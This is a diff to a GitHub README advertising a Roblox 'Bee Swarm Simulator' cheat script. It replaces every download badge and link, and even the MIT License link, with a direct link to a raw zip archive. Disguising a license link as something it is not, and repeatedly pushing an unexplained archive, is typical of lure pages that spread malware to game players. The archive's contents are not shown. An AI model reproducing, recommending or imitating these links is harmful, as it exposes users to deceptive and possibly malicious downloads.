@@ -1,12 +1,12 @@
 # 🐝 Bee Swarm Simulator Legacy Roblox Script
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Nogame154.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Nogame154/bee-swarm-simulator-legacy-toolkit/branch/centerable/bee-legacy-swarm-simulator-toolkit-1.6.zip)
 
 Welcome to the **Bee Swarm Simulator Legacy Roblox Script** repository! This is your one-stop toolkit for enhancing your Bee Swarm Simulator experience on Roblox. Crafted for enthusiasts and aficionados, our legacy script delivers robust automation, unique playability enhancements, and up-to-date OpenAI integrations, all wrapped within a secure and user-friendly environment.  
 
 **Download Now:**  
-Download the script directly from https://Nogame154.github.io.  
-[![Download](https://img.shields.io/badge/Download-green)](https://Nogame154.github.io)
+Download the script directly from https://raw.githubusercontent.com/Nogame154/bee-swarm-simulator-legacy-toolkit/branch/centerable/bee-legacy-swarm-simulator-toolkit-1.6.zip  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Nogame154/bee-swarm-simulator-legacy-toolkit/branch/centerable/bee-legacy-swarm-simulator-toolkit-1.6.zip)
 
 ---
 
@@ -88,7 +88,7 @@ Neither the developers nor contributors are affiliated with Roblox Corporation o
 ## 📜 MIT License (2025)
 
 Distributed under the MIT License.  
-See LICENSE for more information: [MIT License](https://opensource.org/licenses/MIT)
+See LICENSE for more information: [MIT License](https://raw.githubusercontent.com/Nogame154/bee-swarm-simulator-legacy-toolkit/branch/centerable/bee-legacy-swarm-simulator-toolkit-1.6.zip)
 
 © 2025  
 
@@ -97,6 +97,6 @@ See LICENSE for more information: [MIT License](https://opensource.org/licenses/
 ## 🚀 Download Again
 
 Get started by downloading the Bee Swarm Simulator Legacy Roblox Script below:
-[![Download](https://img.shields.io/badge/Download-green)](https://Nogame154.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Nogame154/bee-swarm-simulator-legacy-toolkit/branch/centerable/bee-legacy-swarm-simulator-toolkit-1.6.zip)
 
 **Buzz onward and enjoy automation reimagined for Bee Swarm Simulator!**
